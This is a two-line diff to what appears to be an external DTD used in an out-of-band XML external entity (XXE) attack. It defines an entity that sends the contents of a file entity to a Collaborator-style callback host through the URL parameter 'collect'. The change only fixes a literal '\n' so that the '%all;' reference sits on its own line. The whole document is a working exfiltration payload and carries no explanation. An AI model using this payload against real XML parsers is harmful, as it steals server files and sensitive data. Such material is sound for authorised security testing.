@@ -1,1 +1,2 @@
-<!ENTITY % all "<!ENTITY send SYSTEM 'otljbi1imywihpimotgmfdombdh35s.cigitalcollaborator.com/?collect=%file;'> "> \n %all;
+<!ENTITY % all "<!ENTITY send SYSTEM 'otljbi1imywihpimotgmfdombdh35s.cigitalcollaborator.com/?collect=%file;'> ">
+%all;
